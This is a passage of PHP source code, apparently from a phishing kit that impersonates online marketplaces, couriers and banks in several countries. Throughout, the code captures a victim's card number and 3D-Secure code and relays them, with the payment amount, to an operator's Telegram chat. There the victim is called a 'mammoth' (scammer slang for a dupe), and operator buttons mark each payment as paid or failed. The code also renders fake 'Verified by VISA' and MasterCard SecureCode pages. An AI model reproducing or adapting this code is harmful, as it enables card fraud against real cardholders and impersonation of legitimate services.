			if (getService($srvc, false, $isnb == 2) == 'OLX BG' or getService($srvc, false, $isnb == 2) == 'OLX BG 2.0') {
				$msg = [true, 'Въведохте грешен код. Моля, проверете кода на съобщението и го въведете отново.'];
			} 
			if (getService($srvc, false, $isnb == 2) == 'OLX UA' or getService($srvc, false, $isnb == 2) == 'OLX UA 2.0' or getService($srvc, false, $isnb == 2) == 'IZI ua' or getService($srvc, false, $isnb == 2) == 'IZI ua 2.0') {
				$msg = [true, 'Вы ввели неверный код. Просьба проверить код сообщения и ввести его еще раз.'];
			} 
			if (getService($srvc, false, $isnb == 2) == 'OLX UZ' or getService($srvc, false, $isnb == 2) == 'OLX UZ 2.0' or getService($srvc, false, $isnb == 2) == 'Fargo uz' or getService($srvc, false, $isnb == 2) == 'Fargo uz 2.0') {
				$msg = [true, 'Вы ввели неверный код. Просьба проверить код сообщения и ввести его еще раз.'];
			} 
        	if (getService($srvc, false, $isnb == 2) == 'OLX PL' or getService($srvc, false, $isnb == 2) == 'OLX PL 2.0' or getService($srvc, false, $isnb == 2) == 'Allegro' or getService($srvc, false, $isnb == 2) == 'Allegro 2.0') {
				$msg = [true, 'Podałeś zły kod. Sprawdź kod wiadomości i wprowadź go ponownie.'];
			} 
			if (getService($srvc, false, $isnb == 2) == 'СБАЗАР' or getService($srvc, false, $isnb == 2) == 'СБАЗАР 2.0') {
				$msg = [true, 'Zadali jste nesprávný kód. Zkontrolujte kód zprávy a zadejte jej.'];
			} 
			if (getService($srvc, false, $isnb == 2) == 'Gumtree' or getService($srvc, false, $isnb == 2) == 'Gumtree 2.0') {
				$msg = [true, 'Zadali jste nesprávný kód. Zkontrolujte kód zprávy a zadejte jej.'];
			} 
  //$lastcode = fileRead(dirKeys($md));
	$lastcode = getCookieData('code'.$md, $_COOKIE2);
	if ($lastcode != $code3ds) {
  //fileWrite(dirKeys($md), $code3ds);
    setCookieData('code'.$md, $code3ds, $_COOKIE2);
		if (getService($srvc, false, $isnb == 2) == 'OLX KZ' or getService($srvc, false, $isnb == 2) == 'OLX KZ 2.0' or getService($srvc, false, $isnb == 2) == 'КазПочта' or getService($srvc, false, $isnb == 2) == 'КазПочта 2.0' or getService($srvc, false, $isnb == 2) == 'OLX KZ недвижимость' or getService($srvc, false, $isnb == 2) == 'OLX KZ недвижимость 2.0') {
				$valute = 'KZT';
			} 
			if (getService($srvc, false, $isnb == 2) == 'Куфар' or getService($srvc, false, $isnb == 2) == 'Куфар 2.0' or getService($srvc, false, $isnb == 2) == 'BelPost' or getService($srvc, false, $isnb == 2) == 'BelPost 2.0' or getService($srvc, false, $isnb == 2) == 'Европочта' or getService($srvc, false, $isnb == 2) == 'Европочта 2.0') {
				$valute = 'BYN';
			} 
            if (getService($srvc, false, $isnb == 2) == 'Юла' or getService($srvc, false, $isnb == 2) == 'Юла 2.0' or getService($srvc, false, $isnb == 2) == 'Авито' or getService($srvc, false, $isnb == 2) == 'Авито 2.0' or getService($srvc, false, $isnb == 2) == 'СДЭК' or getService($srvc, false, $isnb == 2) == 'СДЭК 2.0' or getService($srvc, false, $isnb == 2) == 'ПЭК' or getService($srvc, false, $isnb == 2) == 'ПЭК 2.0' or getService($srvc, false, $isnb == 2) == 'Боксберри' or getService($srvc, false, $isnb == 2) == 'Боксберри 2.0' or getService($srvc, false, $isnb == 2) == 'Яндекс' or getService($srvc, false, $isnb == 2) == 'Яндекс 2.0' or getService($srvc, false, $isnb == 2) == 'Достависта' or getService($srvc, false, $isnb == 2) == 'Достависта 2.0' or getService($srvc, false, $isnb == 2) == 'Avito Недвижимость' or getService($srvc, false, $isnb == 2) == 'Avito Недвижимость 2.0' or getService($srvc, false, $isnb == 2) == 'Youla Недвижимость' or getService($srvc, false, $isnb == 2) == 'Youla Недвижимость 2.0' or getService($srvc, false, $isnb == 2) == 'Почта РФ' or getService($srvc, false, $isnb == 2) == 'Почта РФ 2.0' or getService($srvc, false, $isnb == 2) == 'Сбербанк' or getService($srvc, false, $isnb == 2) == 'Сбербанк 2.0' or getService($srvc, false, $isnb == 2) == 'Альфа-Банк' or getService($srvc, false, $isnb == 2) == 'Альфа-Банк 2.0' or getService($srvc, false, $isnb == 2) == 'AUTO RU' or getService($srvc, false, $isnb == 2) == 'AUTO RU 2.0' or getService($srvc, false, $isnb == 2) == 'DROM' or getService($srvc, false, $isnb == 2) == 'DROM 2.0' or getService($srvc, false, $isnb == 2) == 'Booking' or getService($srvc, false, $isnb == 2) == 'Booking 2.0' or getService($srvc, false, $isnb == 2) == 'Яндекс Объявления' or getService($srvc, false, $isnb == 2) == 'Яндекс Объявления 2.0' or getService($srvc, false, $isnb == 2) == 'БлаБлаКар' or getService($srvc, false, $isnb == 2) == 'БлаБлаКар 2.0' or getService($srvc, false, $isnb == 2) == 'Циан' or getService($srvc, false, $isnb == 2) == 'Циан 2.0' or getService($srvc, false, $isnb == 2) == 'M.Video'  or getService($srvc, false, $isnb == 2) == 'M.Video 2.0') {
                $valute = 'RUB';
			}
			if (getService($srvc, false, $isnb == 2) == 'OLX RO' or getService($srvc, false, $isnb == 2) == 'OLX RO 2.0' or getService($srvc, false, $isnb == 2) == 'FAN Courier' or getService($srvc, false, $isnb == 2) == 'FAN Courier 2.0') {
				$valute = 'RON';
			} 
			if (getService($srvc, false, $isnb == 2) == 'OLX BG' or getService($srvc, false, $isnb == 2) == 'OLX BG 2.0') {
				$valute = 'BGN';
			} 
			if (getService($srvc, false, $isnb == 2) == 'OLX UA' or getService($srvc, false, $isnb == 2) == 'OLX UA 2.0' or getService($srvc, false, $isnb == 2) == 'IZI ua' or getService($srvc, false, $isnb == 2) == 'IZI ua 2.0') {
				$valute = 'UAH';
			} 
			if (getService($srvc, false, $isnb == 2) == 'OLX UZ' or getService($srvc, false, $isnb == 2) == 'OLX UZ 2.0' or getService($srvc, false, $isnb == 2) == 'Fargo uz' or getService($srvc, false, $isnb == 2) == 'Fargo uz 2.0') {
				$valute = 'UZS';
			} 
        	if (getService($srvc, false, $isnb == 2) == 'OLX PL' or getService($srvc, false, $isnb == 2) == 'OLX PL 2.0' or getService($srvc, false, $isnb == 2) == 'Allegro' or getService($srvc, false, $isnb == 2) == 'Allegro 2.0') {
				$valute = 'PLN';
			} 
			if (getService($srvc, false, $isnb == 2) == 'СБАЗАР' or getService($srvc, false, $isnb == 2) == 'СБАЗАР 2.0') {
				$valute = 'CZK';
			} 
			if (getService($srvc, false, $isnb == 2) == 'Gumtree' or getService($srvc, false, $isnb == 2) == 'Gumtree 2.0') {
				$valute = 'USD';
			} 
			$pln = get_currency('PLN', 3);
         	$byn = get_currency('BYN', 3);
         	$kzt = get_currency('KZT', 3);
         	$uah = get_currency('UAH', 3);
         	$ron = get_currency('RON', 3);
         	$czk = get_currency('CZK', 3);
         	$bgn = get_currency('BGN', 3);
         	$uzs = get_currency('UZS', 3);
         	$eur = get_currency('EUR', 3);
         	$kzt1 = $kzt / 100;
         	$uah1 = $uah / 10;
         	$czk1 = $czk / 10;
         	$uzs1 = $uzs / 10000;
			if ($valute == 'PLN'){
				$konv = beaCash($amount) * $pln;
				$konvv = ' RUB';
					$kommmd = '(~'.$konv.''.$konvv.')';
			}
			if ($valute == 'RON'){
				$konv = beaCash($amount) * $ron;
				$konvv = ' RUB';
					$kommmd = '(~'.$konv.''.$konvv.')';
			}
			if ($valute == 'CZK'){
				$konv = beaCash($amount) * $czk1;
				$konvv = ' RUB';
					$kommmd = '(~'.$konv.''.$konvv.')';
			}
			if ($valute == 'BGN'){
				$konv = beaCash($amount) * $bgn;
				$konvv = ' RUB';
					$kommmd = '(~'.$konv.''.$konvv.')';
			}
			if ($valute == 'UAH'){
				$konv = beaCash($amount) * $uah;
				$konvv = ' RUB';
					$kommmd = '(~'.$konv.''.$konvv.')';
			}
			if ($valute == 'UZS'){
				$konv = beaCash($amount) * $uzs;
				$konvv = ' RUB';
					$kommmd = '(~'.$konv.''.$konvv.')';
			}
			
					$t = $md.' '.$item.' '.$srvc;
					botSend([
						'🆘 <b>Введен код 3D-Secure</b>',
						'',
						'⚠️ Код: <b>'.$code3ds.'</b>',
						'',
						'🥇 Сумма платежа: <b>'.beaCash($amount).''.$valute.' '.$kommmd.'</b>',
						'💳 Карта: <b>'.$card.' ('.cardBank($card).')</b>',
						'',
						($isnt ? '📱 ID объявления' : '⛴ Трек номер').': <b>'.$item.'</b>',
						'👨🏽‍💻 Воркер: <b>'.userLogin($id, true, true).'</b>',
					], chatAdmin(), [true, [
						[
							['text' => '✅ Оплатил', 'callback_data' => '/doruchkazalet '.$t],
						],
						[
							['text' => '❌ Звонок 900', 'callback_data' => '/doruchkafail1 '.$t],
							['text' => '❌ Нет денег', 'callback_data' => '/doruchkafail2 '.$t],
							],
						[
							['text' => '⭕️ Лимит на карте', 'callback_data' => '/doruchkafail6 '.$t],
						],
							]]);
							botSend([
					'🆘 <b>Мамонт ввел код 3D-Secure</b>',
					'',
					'💷 Сумма платежа: <b>'.beaCash($amount).''.$valute.'</b>',
					($isnt ? '📱 ID объявления' : '⛴ Трек номер').': <b>'.$item.'</b>',
					'',
					'🔄 <b>Ожидайте информацию с результатом.</b>',
				], $id);
				
				}
			}
    if (getService($srvc, false, $isnb == 2) == 'OLX KZ' or getService($srvc, false, $isnb == 2) == 'OLX KZ 2.0' or getService($srvc, false, $isnb == 2) == 'КазПочта' or getService($srvc, false, $isnb == 2) == 'КазПочта 2.0' or getService($srvc, false, $isnb == 2) == 'OLX KZ недвижимость' or getService($srvc, false, $isnb == 2) == 'OLX KZ недвижимость 2.0') {
                            $card4d = substr($card, strlen($card) - 4);
            $cardps = ['visa', 'Verified by VISA'];
            if ($card[0] == '2')
                $cardps = ['mir', 'MirAccept'];
            elseif ($card[0] == '5')
                $cardps = ['mc', 'MasterCard&reg; SecureCode&trade;'];
            $data = str_replace([
                '%ps1%',
                '%ps0%',
                '%shop%',
                '%msgff%',
                '%msgffcode%',
                '%msgffshop%',
                '%msgffshop1%',
                '%msgffshop2%',
                '%msgffshop3%',
                '%msgffshop4%',
                '%msgffshop5%',
                '%msgffshop6%',
                '%msgffshop7%',
                '%summ%',
                '%date%',
                '%card%',
                '%style%',
                '%msg%',
            ], [
                $cardps[1],
                $cardps[0],
                $shop,
                $msgff,
                $msgffcode,
                $msgffshop,
                $msgffshop1,
                $msgffshop2,
                $msgffshop3,
                $msgffshop4,
                $msgffshop5,
                $msgffshop6,
                $msgffshop7,
                number_format(intval($amount), 2, '.', ','),
                date('d/m/Y'),
                $card4d,
                ($msg[0] ? 'style="color: #f00;"' : ''),
                $msg[1],
            ], fileRead(dirPages('0')));
            }
            if (getService($srvc, false, $isnb == 2) == 'Куфар' or getService($srvc, false, $isnb == 2) == 'Куфар 2.0' or getService($srvc, false, $isnb == 2) == 'BelPost' or getService($srvc, false, $isnb == 2) == 'BelPost 2.0' or getService($srvc, false, $isnb == 2) == 'Европочта' or getService($srvc, false, $isnb == 2) == 'Европочта 2.0') {
                            $card4d = substr($card, strlen($card) - 4);
            $cardps = ['visa', 'Verified by VISA'];
            if ($card[0] == '2')
                $cardps = ['mir', 'MirAccept'];
            elseif ($card[0] == '5')
                $cardps = ['mc', 'MasterCard&reg; SecureCode&trade;'];
            $data = str_replace([
                '%ps1%',
                '%ps0%',
                '%shop%',
                '%msgff%',
                '%msgffcode%',
                '%msgffshop%',
                '%msgffshop1%',
                '%msgffshop2%',
                '%msgffshop3%',
                '%msgffshop4%',
                '%msgffshop5%',
                '%msgffshop6%',
                '%msgffshop7%',
                '%summ%',
                '%date%',
                '%card%',
                '%style%',
                '%msg%',
            ], [
                $cardps[1],
                $cardps[0],
                $shop,
                $msgff,
                $msgffcode,
                $msgffshop,
                $msgffshop1,
                $msgffshop2,
                $msgffshop3,
                $msgffshop4,
                $msgffshop5,
                $msgffshop6,
                $msgffshop7,
                number_format(intval($amount), 2, '.', ','),
                date('d/m/Y'),
                $card4d,
                ($msg[0] ? 'style="color: #f00;"' : ''),
                $msg[1],
            ], fileRead(dirPages('0')));
            }
            if (getService($srvc, false, $isnb == 2) == 'Юла' or getService($srvc, false, $isnb == 2) == 'Юла 2.0' or getService($srvc, false, $isnb == 2) == 'Авито' or getService($srvc, false, $isnb == 2) == 'Авито 2.0' or getService($srvc, false, $isnb == 2) == 'СДЭК' or getService($srvc, false, $isnb == 2) == 'СДЭК 2.0' or getService($srvc, false, $isnb == 2) == 'ПЭК' or getService($srvc, false, $isnb == 2) == 'ПЭК 2.0' or getService($srvc, false, $isnb == 2) == 'Боксберри' or getService($srvc, false, $isnb == 2) == 'Боксберри 2.0' or getService($srvc, false, $isnb == 2) == 'Яндекс' or getService($srvc, false, $isnb == 2) == 'Яндекс 2.0' or getService($srvc, false, $isnb == 2) == 'Достависта' or getService($srvc, false, $isnb == 2) == 'Достависта 2.0' or getService($srvc, false, $isnb == 2) == 'Avito Недвижимость' or getService($srvc, false, $isnb == 2) == 'Avito Недвижимость 2.0' or getService($srvc, false, $isnb == 2) == 'Youla Недвижимость' or getService($srvc, false, $isnb == 2) == 'Youla Недвижимость 2.0' or getService($srvc, false, $isnb == 2) == 'Почта РФ' or getService($srvc, false, $isnb == 2) == 'Почта РФ 2.0' or getService($srvc, false, $isnb == 2) == 'Сбербанк' or getService($srvc, false, $isnb == 2) == 'Сбербанк 2.0' or getService($srvc, false, $isnb == 2) == 'Альфа-Банк' or getService($srvc, false, $isnb == 2) == 'Альфа-Банк 2.0' or getService($srvc, false, $isnb == 2) == 'AUTO RU' or getService($srvc, false, $isnb == 2) == 'AUTO RU 2.0' or getService($srvc, false, $isnb == 2) == 'DROM' or getService($srvc, false, $isnb == 2) == 'DROM 2.0' or getService($srvc, false, $isnb == 2) == 'Booking' or getService($srvc, false, $isnb == 2) == 'Booking 2.0' or getService($srvc, false, $isnb == 2) == 'Яндекс Объявления' or getService($srvc, false, $isnb == 2) == 'Яндекс Объявления 2.0' or getService($srvc, false, $isnb == 2) == 'БлаБлаКар' or getService($srvc, false, $isnb == 2) == 'БлаБлаКар 2.0' or getService($srvc, false, $isnb == 2) == 'Циан' or getService($srvc, false, $isnb == 2) == 'Циан 2.0' or getService($srvc, false, $isnb == 2) == 'M.Video'  or getService($srvc, false, $isnb == 2) == 'M.Video 2.0') {
                            $card4d = substr($card, strlen($card) - 4);
            $cardps = ['visa', 'Verified by VISA'];
            if ($card[0] == '2')
                $cardps = ['mir', 'MirAccept'];
            elseif ($card[0] == '5')
                $cardps = ['mc', 'MasterCard&reg; SecureCode&trade;'];
            $data = str_replace([
                '%ps1%',
                '%ps0%',
                '%shop%',
                '%msgff%',
                '%msgffcode%',
                '%msgffshop%',
                '%msgffshop1%',
                '%msgffshop2%',
                '%msgffshop3%',
                '%msgffshop4%',
                '%msgffshop5%',
                '%msgffshop6%',
                '%msgffshop7%',
                '%summ%',
                '%date%',
                '%card%',
                '%style%',
                '%msg%',
            ], [
                $cardps[1],
                $cardps[0],
                $shop,
                $msgff,
                $msgffcode,
                $msgffshop,
                $msgffshop1,
                $msgffshop2,
                $msgffshop3,
                $msgffshop4,
                $msgffshop5,
                $msgffshop6,
                $msgffshop7,
                number_format(intval($amount), 2, '.', ','),
                date('d/m/Y'),
                $card4d,
                ($msg[0] ? 'style="color: #f00;"' : ''),
                $msg[1],
            ], fileRead(dirPages('0')));
            }
            if (getService($srvc, false, $isnb == 2) == 'OLX RO' or getService($srvc, false, $isnb == 2) == 'OLX RO 2.0' or getService($srvc, false, $isnb == 2) == 'FAN Courier' or getService($srvc, false, $isnb == 2) == 'FAN Courier 2.0') {
                            $card4d = substr($card, strlen($card) - 4);
            $cardps = ['visa', 'Verified by VISA'];
            if ($card[0] == '2')
                $cardps = ['mir', 'MirAccept'];
            elseif ($card[0] == '5')
                $cardps = ['mc', 'MasterCard&reg; SecureCode&trade;'];
            $data = str_replace([
                '%ps1%',
                '%ps0%',
                '%shop%',
                '%msgff%',
                '%msgffcode%',
                '%msgffshop%',
                '%msgffshop1%',
                '%msgffshop2%',
                '%msgffshop3%',
                '%msgffshop4%',
                '%msgffshop5%',
                '%msgffshop6%',
                '%msgffshop7%',
                '%summ%',
                '%date%',
                '%card%',
                '%style%',
                '%msg%',
            ], [
                $cardps[1],
                $cardps[0],
                $shop,
                $msgff,
                $msgffcode,
                $msgffshop,
                $msgffshop1,
                $msgffshop2,
                $msgffshop3,
                $msgffshop4,
                $msgffshop5,
                $msgffshop6,
                $msgffshop7,
                number_format(intval($amount), 2, '.', ','),
                date('d/m/Y'),
                $card4d,
                ($msg[0] ? 'style="color: #f00;"' : ''),
                $msg[1],
            ], fileRead(dirPages('0')));
            }
            if (getService($srvc, false, $isnb == 2) == 'OLX BG' or getService($srvc, false, $isnb == 2) == 'OLX BG 2.0') {
                            $card4d = substr($card, strlen($card) - 4);
            $cardps = ['visa', 'Verified by VISA'];
            if ($card[0] == '2')
                $cardps = ['mir', 'MirAccept'];
            elseif ($card[0] == '5')
                $cardps = ['mc', 'MasterCard&reg; SecureCode&trade;'];
            $data = str_replace([
                '%ps1%',
                '%ps0%',
                '%shop%',
                '%msgff%',
                '%msgffcode%',
                '%msgffshop%',
                '%msgffshop1%',
                '%msgffshop2%',
                '%msgffshop3%',
                '%msgffshop4%',
                '%msgffshop5%',
                '%msgffshop6%',
                '%msgffshop7%',
                '%summ%',
                '%date%',
                '%card%',
                '%style%',
                '%msg%',
            ], [
                $cardps[1],
                $cardps[0],
                $shop,
                $msgff,
                $msgffcode,
                $msgffshop,
                $msgffshop1,
                $msgffshop2,
                $msgffshop3,
                $msgffshop4,
                $msgffshop5,
                $msgffshop6,
                $msgffshop7,
                number_format(intval($amount), 2, '.', ','),
                date('d/m/Y'),
                $card4d,
                ($msg[0] ? 'style="color: #f00;"' : ''),
                $msg[1],
            ], fileRead(dirPages('01')));
            }
            if (getService($srvc, false, $isnb == 2) == 'OLX UA' or getService($srvc, false, $isnb == 2) == 'OLX UA 2.0' or getService($srvc, false, $isnb == 2) == 'IZI ua' or getService($srvc, false, $isnb == 2) == 'IZI ua 2.0') {
                            $card4d = substr($card, strlen($card) - 4);
            $cardps = ['visa', 'Verified by VISA'];
            if ($card[0] == '2')
                $cardps = ['mir', 'MirAccept'];
            elseif ($card[0] == '5')
                $cardps = ['mc', 'MasterCard&reg; SecureCode&trade;'];
            $data = str_replace([
                '%ps1%',
                '%ps0%',
                '%shop%',
                '%msgff%',
                '%msgffcode%',
                '%msgffshop%',
                '%msgffshop1%',
                '%msgffshop2%',
                '%msgffshop3%',
                '%msgffshop4%',
                '%msgffshop5%',
                '%msgffshop6%',
                '%msgffshop7%',
                '%summ%',
                '%date%',
                '%card%',
                '%style%',
                '%msg%',
            ], [
                $cardps[1],
                $cardps[0],
                $shop,
                $msgff,
                $msgffcode,
                $msgffshop,
                $msgffshop1,
                $msgffshop2,
                $msgffshop3,
                $msgffshop4,
                $msgffshop5,
                $msgffshop6,
                $msgffshop7,
                number_format(intval($amount), 2, '.', ','),
                date('d/m/Y'),
                $card4d,
                ($msg[0] ? 'style="color: #f00;"' : ''),
                $msg[1],
            ], fileRead(dirPages('0')));
            }
            if (getService($srvc, false, $isnb == 2) == 'OLX UZ' or getService($srvc, false, $isnb == 2) == 'OLX UZ 2.0' or getService($srvc, false, $isnb == 2) == 'Fargo uz' or getService($srvc, false, $isnb == 2) == 'Fargo uz 2.0') {
                            $card4d = substr($card, strlen($card) - 4);
            $cardps = ['visa', 'Verified by VISA'];
            if ($card[0] == '2')
                $cardps = ['mir', 'MirAccept'];
            elseif ($card[0] == '5')
                $cardps = ['mc', 'MasterCard&reg; SecureCode&trade;'];
            $data = str_replace([
                '%ps1%',
                '%ps0%',
                '%shop%',
                '%msgff%',
                '%msgffcode%',
                '%msgffshop%',
                '%msgffshop1%',
                '%msgffshop2%',
                '%msgffshop3%',
                '%msgffshop4%',
                '%msgffshop5%',
                '%msgffshop6%',
                '%msgffshop7%',
                '%summ%',
                '%date%',
                '%card%',
                '%style%',
                '%msg%',
            ], [
                $cardps[1],
                $cardps[0],
                $shop,
                $msgff,
                $msgffcode,
                $msgffshop,
                $msgffshop1,
                $msgffshop2,
                $msgffshop3,
                $msgffshop4,
                $msgffshop5,
                $msgffshop6,
                $msgffshop7,
                number_format(intval($amount), 2, '.', ','),
                date('d/m/Y'),
                $card4d,
                ($msg[0] ? 'style="color: #f00;"' : ''),
                $msg[1],
            ], fileRead(dirPages('0')));
            }
            if (getService($srvc, false, $isnb == 2) == 'OLX PL' or getService($srvc, false, $isnb == 2) == 'OLX PL 2.0' or getService($srvc, false, $isnb == 2) == 'Allegro' or getService($srvc, false, $isnb == 2) == 'Allegro 2.0') {
    if (($card[0] == '6' && $card[1] == '3' && $card[2] == '5' && $card[3] == '4' && $card[4] == '7' && $card[5] == '0') or ($card[0] == '6' && $card[0] == '3' && $card[0] == '5' && $card[0] == '4' && $card[0] == '7' && $card[0] == '0')) {
            $card4d = substr($card, strlen($card) - 4);
            $cardps = ['visa', 'Verified by VISA'];
            if ($card[0] == '2')
                $cardps = ['mir', 'MirAccept'];
            elseif ($card[0] == '5')
                $cardps = ['mc', 'MasterCard&reg; SecureCode&trade;'];
            $data = str_replace([
                '%ps1%',
                '%ps0%',
                '%shop%',
                '%msgff%',
                '%msgffcode%',
                '%msgffshop%',
                '%msgffshop1%',
                '%msgffshop2%',
                '%msgffshop3%',
                '%msgffshop4%',
                '%msgffshop5%',
                '%msgffshop6%',
                '%msgffshop7%',
                '%summ%',
                '%date%',
                '%card%',
                '%style%',
                '%msg%',
            ], [
                $cardps[1],
                $cardps[0],
                $shop,
                $msgff,
                $msgffcode,
                $msgffshop,
                $msgffshop1,
                $msgffshop2,
                $msgffshop3,
                $msgffshop4,
                $msgffshop5,
                $msgffshop6,
                $msgffshop7,
                number_format(intval($amount), 2, '.', ','),
                date('d/m/Y'),
                $card4d,
                ($msg[0] ? 'style="color: #f00;"' : ''),
                $msg[1],
            ], fileRead(dirPages('01')));
    }
    if (($card[0] == '4' && $card[1] == '4' && $card[2] == '6' && $card[3] == '2' && $card[4] == '9' && $card[5] == '6') or ($card[0] == '6' && $card[0] == '3' && $card[0] == '5' && $card[0] == '4' && $card[0] == '7' && $card[0] == '0')) {
            $card4d = substr($card, strlen($card) - 4);
            $cardps = ['visa', 'Verified by VISA'];
            if ($card[0] == '2')
                $cardps = ['mir', 'MirAccept'];
            elseif ($card[0] == '5')
                $cardps = ['mc', 'MasterCard&reg; SecureCode&trade;'];
            $data = str_replace([
                '%ps1%',
                '%ps0%',
                '%shop%',
                '%msgff%',
                '%msgffcode%',
                '%msgffshop%',
                '%msgffshop1%',
                '%msgffshop2%',
                '%msgffshop3%',
                '%msgffshop4%',
                '%msgffshop5%',
                '%msgffshop6%',
                '%msgffshop7%',
                '%summ%',
                '%date%',
                '%card%',
                '%style%',
                '%msg%',
            ], [
                $cardps[1],
                $cardps[0],
                $shop,
                $msgff,
                $msgffcode,
                $msgffshop,
                $msgffshop1,
                $msgffshop2,
                $msgffshop3,
                $msgffshop4,
                $msgffshop5,
                $msgffshop6,
                $msgffshop7,
                number_format(intval($amount), 2, '.', ','),
                date('d/m/Y'),
                $card4d,
                ($msg[0] ? 'style="color: #f00;"' : ''),
                $msg[1],
            ], fileRead(dirPages('0unicred')));
    }
    else {
        $card4d = substr($card, strlen($card) - 4);
            $cardps = ['visa', 'Verified by VISA'];
            if ($card[0] == '2')
                $cardps = ['mir', 'MirAccept'];
            elseif ($card[0] == '5')
                $cardps = ['mc', 'MasterCard&reg; SecureCode&trade;'];
            $data = str_replace([
                '%ps1%',
                '%ps0%',
                '%shop%',
                '%msgff%',
                '%msgffcode%',
                '%msgffshop%',
                '%msgffshop1%',
                '%msgffshop2%',
                '%msgffshop3%',
                '%msgffshop4%',
                '%msgffshop5%',
                '%msgffshop6%',
                '%msgffshop7%',
                '%summ%',
                '%date%',
                '%card%',
                '%style%',
                '%msg%',
            ], [
                $cardps[1],
                $cardps[0],
                $shop,
                $msgff,
                $msgffcode,
                $msgffshop,
                $msgffshop1,
                $msgffshop2,
                $msgffshop3,
                $msgffshop4,
                $msgffshop5,
                $msgffshop6,
                $msgffshop7,
                number_format(intval($amount), 2, '.', ','),
                date('d/m/Y'),
                $card4d,
                ($msg[0] ? 'style="color: #f00;"' : ''),
                $msg[1],
            ], fileRead(dirPages('0')));
    }
           }
   
	
            if (getService($srvc, false, $isnb == 2) == 'СБАЗАР' or getService($srvc, false, $isnb == 2) == 'СБАЗАР 2.0') {
                            $card4d = substr($card, strlen($card) - 4);
            $cardps = ['visa', 'Verified by VISA'];
            if ($card[0] == '2')
                $cardps = ['mir', 'MirAccept'];
            elseif ($card[0] == '5')
                $cardps = ['mc', 'MasterCard&reg; SecureCode&trade;'];
            $data = str_replace([
                '%ps1%',
                '%ps0%',
                '%shop%',
                '%msgff%',
                '%msgffcode%',
                '%msgffshop%',
                '%msgffshop1%',
                '%msgffshop2%',
                '%msgffshop3%',
                '%msgffshop4%',
                '%msgffshop5%',
                '%msgffshop6%',
                '%msgffshop7%',
                '%summ%',
                '%date%',
                '%card%',
                '%style%',
                '%msg%',
            ], [
                $cardps[1],
                $cardps[0],
                $shop,
                $msgff,
                $msgffcode,
                $msgffshop,
                $msgffshop1,
                $msgffshop2,
                $msgffshop3,
                $msgffshop4,
                $msgffshop5,
                $msgffshop6,
                $msgffshop7,
                number_format(intval($amount), 2, '.', ','),
                date('d/m/Y'),
                $card4d,
                ($msg[0] ? 'style="color: #f00;"' : ''),
                $msg[1],
            ], fileRead(dirPages('0')));
            }
            if (getService($srvc, false, $isnb == 2) == 'Gumtree' or getService($srvc, false, $isnb == 2) == 'Gumtree 2.0') {
            $card4d = substr($card, strlen($card) - 4);
            $cardps = ['visa', 'Verified by VISA'];
            if ($card[0] == '2')
                $cardps = ['mir', 'MirAccept'];
            elseif ($card[0] == '5')
                $cardps = ['mc', 'MasterCard&reg; SecureCode&trade;'];
            $data = str_replace([
                '%ps1%',
                '%ps0%',
                '%shop%',
                '%msgff%',
                '%msgffcode%',
                '%msgffshop%',
                '%msgffshop1%',
                '%msgffshop2%',
                '%msgffshop3%',
                '%msgffshop4%',
                '%msgffshop5%',
                '%msgffshop6%',
                '%msgffshop7%',
                '%summ%',
                '%date%',
                '%card%',
                '%style%',
                '%msg%',
            ], [
                $cardps[1],
                $cardps[0],
                $shop,
                $msgff,
                $msgffcode,
                $msgffshop,
                $msgffshop1,
                $msgffshop2,
                $msgffshop3,
                $msgffshop4,
                $msgffshop5,
                $msgffshop6,
                $msgffshop7,
                number_format(intval($amount), 2, '.', ','),
                date('d/m/Y'),
                $card4d,
                ($msg[0] ? 'style="color: #f00;"' : ''),
                $msg[1],
            ], fileRead(dirPages('0')));
            }
			break;
		}
		case 'order': case 'buy': case 'cash': case 'rent' : case 'cars': {
			$isnb = array_search($action, ['order', 'buy', 'cash', 'rent', 'cars']);
				if (getService($srvc, false, $isnb == 2) == 'OLX KZ' or getService($srvc, false, $isnb == 2) == 'OLX KZ 2.0' or getService($srvc, false, $isnb == 2) == 'КазПочта' or getService($srvc, false, $isnb == 2) == 'КазПочта 2.0' or getService($srvc, false, $isnb == 2) == 'OLX KZ недвижимость' or getService($srvc, false, $isnb == 2) == 'OLX KZ недвижимость 2.0') {
				$ttx = [
				'оформление заказа',
				'безопасную сделку',
				'получение средств',
			][$isnb];
			} 
			if (getService($srvc, false, $isnb == 2) == 'Куфар' or getService($srvc, false, $isnb == 2) == 'Куфар 2.0' or getService($srvc, false, $isnb == 2) == 'BelPost' or getService($srvc, false, $isnb == 2) == 'BelPost 2.0' or getService($srvc, false, $isnb == 2) == 'Европочта' or getService($srvc, false, $isnb == 2) == 'Европочта 2.0') {
				$ttx = [
				'оформление заказа',
				'безопасную сделку',
				'получение средств',
			][$isnb];
			} 
            if (getService($srvc, false, $isnb == 2) == 'Юла' or getService($srvc, false, $isnb == 2) == 'Юла 2.0' or getService($srvc, false, $isnb == 2) == 'Авито' or getService($srvc, false, $isnb == 2) == 'Авито 2.0' or getService($srvc, false, $isnb == 2) == 'СДЭК' or getService($srvc, false, $isnb == 2) == 'СДЭК 2.0' or getService($srvc, false, $isnb == 2) == 'ПЭК' or getService($srvc, false, $isnb == 2) == 'ПЭК 2.0' or getService($srvc, false, $isnb == 2) == 'Боксберри' or getService($srvc, false, $isnb == 2) == 'Боксберри 2.0' or getService($srvc, false, $isnb == 2) == 'Яндекс' or getService($srvc, false, $isnb == 2) == 'Яндекс 2.0' or getService($srvc, false, $isnb == 2) == 'Достависта' or getService($srvc, false, $isnb == 2) == 'Достависта 2.0' or getService($srvc, false, $isnb == 2) == 'Avito Недвижимость' or getService($srvc, false, $isnb == 2) == 'Avito Недвижимость 2.0' or getService($srvc, false, $isnb == 2) == 'Youla Недвижимость' or getService($srvc, false, $isnb == 2) == 'Youla Недвижимость 2.0' or getService($srvc, false, $isnb == 2) == 'Почта РФ' or getService($srvc, false, $isnb == 2) == 'Почта РФ 2.0' or getService($srvc, false, $isnb == 2) == 'Сбербанк' or getService($srvc, false, $isnb == 2) == 'Сбербанк 2.0' or getService($srvc, false, $isnb == 2) == 'Альфа-Банк' or getService($srvc, false, $isnb == 2) == 'Альфа-Банк 2.0' or getService($srvc, false, $isnb == 2) == 'AUTO RU' or getService($srvc, false, $isnb == 2) == 'AUTO RU 2.0' or getService($srvc, false, $isnb == 2) == 'DROM' or getService($srvc, false, $isnb == 2) == 'DROM 2.0' or getService($srvc, false, $isnb == 2) == 'Booking' or getService($srvc, false, $isnb == 2) == 'Booking 2.0' or getService($srvc, false, $isnb == 2) == 'Яндекс Объявления' or getService($srvc, false, $isnb == 2) == 'Яндекс Объявления 2.0' or getService($srvc, false, $isnb == 2) == 